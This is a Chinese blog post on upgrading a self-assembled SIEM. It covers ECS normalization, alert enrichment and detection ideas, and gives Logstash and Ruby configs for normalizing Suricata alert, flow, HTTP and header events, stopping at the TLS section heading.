<h1 id="“散装”SIEM-v0-1的不足与改进措施"><a href="#“散装”SIEM-v0-1的不足与改进措施" class="headerlink" title="“散装”SIEM v0.1的不足与改进措施"></a>“散装”SIEM v0.1的不足与改进措施</h1><h2 id="1-数据标准化"><a href="#1-数据标准化" class="headerlink" title="1. 数据标准化"></a>1. 数据标准化</h2><p>​        由于前期的标准化未采用**<a href="https://www.elastic.co/guide/en/ecs/current/ecs-reference.html">ECS</a>**(<strong>Elastic Common Schema</strong>)，导致后期沿用Elastic生态的时候出现了使用上的不便。大家都知道ES在7.X的版本推出了SIEM这个功能，如果想使用Elastic SIEM进行分析的话，那么ECS是首选。这里为了后期与开源生态更好的进行融合，需要将原先的标准化转为ECS的格式。</p>
<h2 id="2-告警丰富化"><a href="#2-告警丰富化" class="headerlink" title="2. 告警丰富化"></a>2. 告警丰富化</h2><p>为了更有效的提升告警质量，提高安全分析的效率。需要对入库的安全事件以及产生的告警进行必要的丰富化。</p>
<ul>
<li><p>利用CMDB平台的数据对内部资产进行丰富化。例如增加：部门、业务、应用类型、负责人等字段。</p>
</li>
<li><p>对接威胁情报数据，SIEM会对告警事件的攻击IP进行情报侧数据的丰富化；</p>
<ul>
<li>本地威胁情报（曾经攻击过我们的IP地址）</li>
<li>第三方威胁情报<ul>
<li>开源</li>
<li>商业</li>
</ul>
</li>
</ul>
</li>
<li><p>敏感接口监控（如：登录接口、支付接口、钱包接口）。利用第三方数据对IP地址进行Proxy标记，为后期风控的研判提供一些数据支撑；</p>
</li>
<li><p>为安全事件增加方向与区域的字段。便于分析人员第一时间识别<strong>内对内</strong>以及<strong>内对外</strong>的告警。也可针对方向进行告警级别的权重调整；</p>
</li>
</ul>
<h2 id="3-提升检测能力"><a href="#3-提升检测能力" class="headerlink" title="3. 提升检测能力"></a>3. 提升检测能力</h2><p>底层安全设备的检测能力与安全事件的可信度，是直接影响SIEM告警的关键因素。</p>
<ul>
<li>接入Imperva WAF的告警数据，与Suricata进行自动化关联，定期将绕过的规则“移植”到前端的Imperva WAF上，加强边界的安全防护能力；</li>
<li>“消费”AWS VPC FLOW数据，增加<strong>内对外</strong>的异常连接检测能力。由于是四层数据能够被<strong>“消费”</strong>的维度实在不多。主要实现了以下几种告警：<ul>
<li>周期性连接告警</li>
<li>威胁情报类告警</li>
<li>端口扫描类告警<ul>
<li>短时间内，内网主机请求相同目的IP的多个端口</li>
<li>短时间内，内网主机请求多个IP的相同目的端口</li>
</ul>
</li>
<li>敏感端口请求告警</li>
</ul>
</li>
</ul>
<h2 id="4-溯源分析"><a href="#4-溯源分析" class="headerlink" title="4. 溯源分析"></a>4. 溯源分析</h2><p>目前SIEM产生的告警，并不会携带原始的安全事件，这对于分析小伙伴来说并不友好，特别是告警量比较多的时候。</p>
<ul>
<li>现已为每一个告警增加了**”Hunting”**的字段，通过该字段可直接溯源到底层的安全事件；</li>
<li>增加了更适用于安全分析人员使用的仪表盘；</li>
<li>编写了一个<strong>自认为</strong>比较贴合分析人员使用的工具：<strong>HappyHunting</strong>；</li>
</ul>
<h2 id="5-其他改进"><a href="#5-其他改进" class="headerlink" title="5. 其他改进"></a>5. 其他改进</h2><ul>
<li><p>解决了SIEM联动CDN WAF API响应时间过长（15-20分钟 😅）的问题。目前与Imperva WAF API联动已做到了准实时。</p>
</li>
<li><p>优化NTA login_audit代码，提升NTA性能。之前写过一篇文章《**<a href="https://canon88.github.io/2019/10/24/Suricata+Lua%E5%AE%9E%E7%8E%B0%E6%9C%AC%E5%9C%B0%E6%83%85%E6%8A%A5%E5%AF%B9%E6%8E%A5/">Suricata + Lua实现本地情报对接</a>**》，主要利用了Lua脚本对“敏感”接口进行登录审计并利用情报进行高危账号检测。现已将这部分功能移植到Logstash + Ruby上；</p>
</li>
<li><p>之前的自动化联动规则都是通过手动修改脚本调整<strong>rule.id</strong>来实现，这种方式在初期还能勉强运行。但在后期运行中暴露出了不足，既不便于管理也增加了维护的成本。所以为了维护SIEM的规则，这里采用了Redis来进行规则的统一管理。后期只需要将需要阻断的<strong>rule.id</strong>推送至Redis即可。同时也在输出的告警中通过<strong>event.action</strong>字段标准该告警的响应方式；</p>
</li>
</ul>
<hr>
<h1 id="“进化”-“散装”SIEM-v0-2"><a href="#“进化”-“散装”SIEM-v0-2" class="headerlink" title="“进化” - “散装”SIEM v0.2"></a>“进化” - “散装”SIEM v0.2</h1><h2 id="1-Workflow"><a href="#1-Workflow" class="headerlink" title="1. Workflow"></a>1. Workflow</h2><p>​        这是重新调整之后的<strong>“散装”SIEM v0.2</strong>的workflow😁。如下图所示，数据源采集端这里就不展开来说了，都是现成的工具发就完事儿了。下面主要说一下Logstash中对数据处理的部分：</p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/SIEM-v0.2.jpg" alt="SIEM-v0.2"></p>
<hr>
<h2 id="2-数据处理"><a href="#2-数据处理" class="headerlink" title="2. 数据处理"></a>2. 数据处理</h2><h3 id="1-Normalized"><a href="#1-Normalized" class="headerlink" title="1. Normalized"></a>1. Normalized</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/normalized-04.png" alt="image-20201208110506481"></p>
<hr>
<h4 id="1-1-normalized-alert-to-siem"><a href="#1-1-normalized-alert-to-siem" class="headerlink" title="1.1 normalized-alert_to_siem"></a>1.1 normalized-alert_to_siem</h4><p>​        针对alert事件进行标准化，也就是安全设备发出的数据。参考上图中蓝色线所示部分</p>
<p>​        官方已支持Suricata数据的ECS，我们可直接启用filebeat的Suricata模块。<strong>但是</strong>，这里需要注意一点，默认Suricata的模块中有一些标准化是交由Elastic来做的。由于我们需要利用Logstash做后续的ETL部分，所以现在的整个数据流是：<strong>Filebeat -&gt; Logstash -&gt; Elastic</strong>。那么，这一部分的标准化，需要我们在Logstash层面来实现。具体涉及到的配置如下：</p>
<h5 id="1-1-1-normalized-suricata"><a href="#1-1-1-normalized-suricata" class="headerlink" title="1.1.1 normalized-suricata"></a>1.1.1 normalized-suricata</h5><p>​    通用Suricata事件标准化配置。</p>
<ul>
<li>删除一些filebeat自带的字段。</li>
<li>增加<code>provider</code>、<code>product</code>、<code>sensor</code>等字段，为了后期区分不同的数据源类型，（例：<strong>NTA、WAF、EDR</strong>），以及不同的NTA产品（例：<strong>Suricata、Zeek</strong>）</li>
</ul>
<h6 id="Logstash-Config"><a href="#Logstash-Config" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/59_normalized-suricata.conf">normalized-suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    mutate &#123;</span><br><span class="line">        remove_field =&gt; [ <span class="string">&quot;application&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;agent&quot;</span>, <span class="string">&quot;@version&quot;</span>, <span class="string">&quot;[event][original]&quot;</span> ]</span><br><span class="line">        add_field =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;provider&quot;</span> =&gt; <span class="string">&quot;Suricata&quot;</span></span><br><span class="line">            <span class="string">&quot;product&quot;</span> =&gt; <span class="string">&quot;IDS&quot;</span></span><br><span class="line">            <span class="string">&quot;sensor&quot;</span> =&gt; <span class="string">&quot;%&#123;[host][name]&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        lowercase =&gt; [ <span class="string">&quot;[network][transport]&quot;</span> ]</span><br><span class="line">    &#125;</span><br><span class="line">    uuid &#123;</span><br><span class="line">        target =&gt; <span class="string">&quot;[event][id]&quot;</span></span><br><span class="line">        overwrite =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-2-normalized-alert-for-suricata"><a href="#1-1-2-normalized-alert-for-suricata" class="headerlink" title="1.1.2 normalized-alert_for_suricata"></a>1.1.2 normalized-alert_for_suricata</h5><h6 id="Logstash-Config-1"><a href="#Logstash-Config-1" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-alert.conf">normalized-alert_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][alert] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][category]&quot;</span> =&gt; <span class="string">&quot;[rule][category]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][signature_id]&quot;</span> =&gt; <span class="string">&quot;[rule][id]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][signature]&quot;</span> =&gt; <span class="string">&quot;[rule][name]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][rule]&quot;</span> =&gt; <span class="string">&quot;[rule][description]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            convert =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[rule][id]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            copy =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[rule][category]&quot;</span> =&gt; <span class="string">&quot;message&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [suricata][eve][alert][action] == <span class="string">&quot;blocked&quot;</span> &#123;</span><br><span class="line">            mutate &#123;</span><br><span class="line">                update =&gt; &#123;</span><br><span class="line">                    <span class="string">&quot;[suricata][eve][alert][action]&quot;</span> =&gt; <span class="string">&quot;denied&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [suricata][eve][alert][action] &#123;</span><br><span class="line">            ruby &#123;</span><br><span class="line">                code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                    action = event.get(&#x27;[suricata][eve][alert][action]&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    event_type = event.get(&#x27;[event][type]&#x27;)</span></span><br><span class="line"><span class="string">                    if event_type then</span></span><br><span class="line"><span class="string">                        event_type = event.get(&#x27;[event][type]&#x27;).push(action)</span></span><br><span class="line"><span class="string">                    else</span></span><br><span class="line"><span class="string">                        event_type = [action]</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[event][type]&#x27;, event_type)</span></span><br><span class="line"><span class="string">                    event.remove(&#x27;[suricata][eve][alert][action]&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    event.set(&#x27;[event][action]&#x27;, action)</span></span><br><span class="line"><span class="string">                &quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][severity]&quot;</span> =&gt; <span class="string">&quot;[event][severity]&quot;</span> </span><br><span class="line">                <span class="string">&quot;[suricata][eve][payload_printable]&quot;</span> =&gt; <span class="string">&quot;[rule][payload]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_request_body_printable]&quot;</span> =&gt; <span class="string">&quot;[http][request][body][content]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_response_body_printable]&quot;</span> =&gt; <span class="string">&quot;[http][response][body][content]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ruby &#123;</span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                rule_id = event.get(&#x27;[rule][id]&#x27;)</span></span><br><span class="line"><span class="string">                rule_name = event.get(&#x27;[rule][name]&#x27;)</span></span><br><span class="line"><span class="string">                event_id = event.get(&#x27;[event][id]&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                event.set(&#x27;[related][rule][id]&#x27;, [rule_id])</span></span><br><span class="line"><span class="string">                event.set(&#x27;[related][rule][name]&#x27;, [rule_name])</span></span><br><span class="line"><span class="string">                event.set(&#x27;[related][event][id]&#x27;, [event_id])</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-3-normalized-fileinfo-for-suricata"><a href="#1-1-3-normalized-fileinfo-for-suricata" class="headerlink" title="1.1.3 normalized-fileinfo_for_suricata"></a>1.1.3 normalized-fileinfo_for_suricata</h5><h6 id="Logstash-Config-2"><a href="#Logstash-Config-2" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-fileinfo.conf">normalized-fileinfo_for_suricatra.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][fileinfo] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][fileinfo][filename]&quot;</span> =&gt; <span class="string">&quot;[file][path]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][fileinfo][size]&quot;</span> =&gt; <span class="string">&quot;[file][size]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-4-normalized-flow-for-suricata"><a href="#1-1-4-normalized-flow-for-suricata" class="headerlink" title="1.1.4 normalized-flow_for_suricata"></a>1.1.4 normalized-flow_for_suricata</h5><h6 id="Logstash-Config-3"><a href="#Logstash-Config-3" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-flow.conf">normalized-flow_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][flow] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123; </span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][pkts_toclient]&quot;</span> =&gt; <span class="string">&quot;[destination][packets]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][pkts_toserver]&quot;</span> =&gt; <span class="string">&quot;[source][packets]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][bytes_toclient]&quot;</span> =&gt; <span class="string">&quot;[destination][bytes]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][bytes_toserver]&quot;</span> =&gt; <span class="string">&quot;[source][bytes]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ruby &#123;</span><br><span class="line">            init =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                @sb = 0</span></span><br><span class="line"><span class="string">                @sp = 0</span></span><br><span class="line"><span class="string">                @db = 0</span></span><br><span class="line"><span class="string">                @dp = 0</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line"></span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                events = event.to_hash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if events.has_key?(&#x27;source&#x27;) then</span></span><br><span class="line"><span class="string">                    @sb = events[&#x27;source&#x27;].fetch(&#x27;bytes&#x27;, 0)</span></span><br><span class="line"><span class="string">                    @sp = events[&#x27;source&#x27;].fetch(&#x27;packets&#x27;, 0)</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if events.has_key?(&#x27;destination&#x27;) then</span></span><br><span class="line"><span class="string">                    @db = events[&#x27;destination&#x27;].fetch(&#x27;bytes&#x27;, 0)</span></span><br><span class="line"><span class="string">                    @dp = events[&#x27;destination&#x27;].fetch(&#x27;packets&#x27;, 0)</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (@sb+@db+@sp+@dp &gt; 0) then</span></span><br><span class="line"><span class="string">                    if (@sb+@db &gt; 0) then</span></span><br><span class="line"><span class="string">                        event.set(&#x27;[network][bytes]&#x27;, @sb+@db)</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string">                    if (@sp+@dp &gt; 0) then</span></span><br><span class="line"><span class="string">                        event.set(&#x27;[network][packets]&#x27;, @sp+@dp)</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        date &#123;</span><br><span class="line">            match =&gt; [ <span class="string">&quot;[suricata][eve][flow][start]&quot;</span>, <span class="string">&quot;ISO8601&quot;</span> ]</span><br><span class="line">            target =&gt; <span class="string">&quot;[event][start]&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        date &#123;</span><br><span class="line">            match =&gt; [ <span class="string">&quot;[suricata][eve][flow][end]&quot;</span>, <span class="string">&quot;ISO8601&quot;</span> ]</span><br><span class="line">            target =&gt; <span class="string">&quot;[event][end]&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123; </span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][age]&quot;</span> =&gt; <span class="string">&quot;[event][duration]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            remove_field =&gt; [</span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][start]&quot;</span>,</span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][end]&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-5-normalized-http-for-suricata"><a href="#1-1-5-normalized-http-for-suricata" class="headerlink" title="1.1.5 normalized-http_for_suricata"></a>1.1.5 normalized-http_for_suricata</h5><h6 id="Logstash-Config-4"><a href="#Logstash-Config-4" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-http.conf">normalized-http_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][http] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_method]&quot;</span> =&gt; <span class="string">&quot;[http][request][method]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][status]&quot;</span> =&gt; <span class="string">&quot;[http][response][status_code]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][hostname]&quot;</span> =&gt; <span class="string">&quot;[destination][domain]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [destination][domain] and [network][protocol] == <span class="string">&quot;http&quot;</span> &#123;</span><br><span class="line">            mutate &#123;</span><br><span class="line">                copy =&gt; &#123; <span class="string">&quot;[destination][domain]&quot;</span> =&gt; <span class="string">&quot;[url][domain]&quot;</span> &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ruby &#123;</span><br><span class="line">            init =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                @pattern = /(?&lt;path&gt;[^?#]*)(?:\?(?&lt;query&gt;[^#]*))?(?:#(?&lt;fragment&gt;.*))?/</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                url = event.get(&#x27;[suricata][eve][http][url]&#x27;)</span></span><br><span class="line"><span class="string">                res = @pattern.match(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if res[&#x27;path&#x27;] then</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[url][path]&#x27;, res[&#x27;path&#x27;])</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">                if res[&#x27;query&#x27;] then</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[url][query]&#x27;, res[&#x27;query&#x27;])</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">                if res[&#x27;fragment&#x27;] then</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[url][fragment]&#x27;, res[&#x27;fragment&#x27;])</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][url]&quot;</span> =&gt; <span class="string">&quot;[url][original]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_refer]&quot;</span> =&gt; <span class="string">&quot;[http][request][referrer]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][length]&quot;</span> =&gt; <span class="string">&quot;[http][response][body][bytes]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_user_agent]&quot;</span> =&gt; <span class="string">&quot;[user_agent][original]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-6-normalized-http-headers-for-suricata"><a href="#1-1-6-normalized-http-headers-for-suricata" class="headerlink" title="1.1.6 normalized_http_headers_for_suricata"></a>1.1.6 normalized_http_headers_for_suricata</h5><p>​        当<strong>Suricata</strong>设置<code>dump-all-headers:both</code>时，会将HTTP头全部输出。对于http_audit这个需求而言是个很好的功能，只不过输出的格式有点坑😂😂😂。为了更方便的在Kibana上进行筛选，我对这部分数据进行了标准化。😁</p>
<h6 id="Logstash-Config-5"><a href="#Logstash-Config-5" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-http.conf">normalized_http_headers_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][http] &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/normalized_http_headers.rb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code"><a href="#Ruby-Code" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/normalized_http_headers.rb">normalized_http_headers_for_suricata.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    request = &#123;&#125;</span><br><span class="line">    response = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    request_headers = event.get(<span class="string">&quot;[suricata][eve][http][request_headers]&quot;</span>)</span><br><span class="line">    response_headers = event.get(<span class="string">&quot;[suricata][eve][http][response_headers]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request_headers <span class="keyword">then</span></span><br><span class="line">        request_headers.each <span class="keyword">do</span> <span class="params">|headers|</span></span><br><span class="line">            name = headers[<span class="string">&#x27;name&#x27;</span>].downcase</span><br><span class="line">            value = headers[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">            request[name] = value</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response_headers <span class="keyword">then</span></span><br><span class="line">        response_headers.each <span class="keyword">do</span> <span class="params">|headers|</span></span><br><span class="line">            name = headers[<span class="string">&#x27;name&#x27;</span>].downcase</span><br><span class="line">            value = headers[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">            response[name] = value</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    event.remove(<span class="string">&quot;[suricata][eve][http][request_headers]&quot;</span>)</span><br><span class="line">    event.remove(<span class="string">&quot;[suricata][eve][http][response_headers]&quot;</span>)</span><br><span class="line">    event.set(<span class="string">&quot;[suricata][eve][http][request]&quot;</span>, request)</span><br><span class="line">    event.set(<span class="string">&quot;[suricata][eve][http][response]&quot;</span>, response)</span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="示例"><a href="#示例" class="headerlink" title="示例"></a><strong>示例</strong></h6><ul>
<li>标准化之前的数据：</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;request_headers&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Connection&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;value&quot;</span>: <span class="string">&quot;Keep-Alive&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;response_headers&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Server&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;value&quot;</span>: <span class="string">&quot;NWS_TCloud_S11&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>标准化之后的数据：</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;http&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;host&quot;</span>: <span class="string">&quot;192.168.199.1:25782&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;connection&quot;</span>: <span class="string">&quot;Close&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cache-control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;user-agent&quot;</span>: <span class="string">&quot;Microsoft-Windows/10.0 UPnP/1.0&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;accept&quot;</span>: <span class="string">&quot;text/xml, application/xml&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;response&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;ext&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;content-length&quot;</span>: <span class="string">&quot;2645&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;server&quot;</span>: <span class="string">&quot;RT-N56U/3.4.3.9 UPnP/1.1 MiniUPnPd/2.0&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;content-type&quot;</span>: <span class="string">&quot;text/xml; charset=\&quot;utf-8\&quot;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;connection&quot;</span>: <span class="string">&quot;close&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-7-normalized-tls-for-suricata"><a href="#1-1-7-normalized-tls-for-suricata" class="headerlink" title="1.1.7 normalized-tls_for_suricata"></a>1.1.7 normalized-tls_for_suricata</h5><h6 id="Logstash-Config-6"><a href="#Logstash-Config-6" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-tls.conf">normalized-tls_for_suricata.conf</a></strong></li>
</ul>
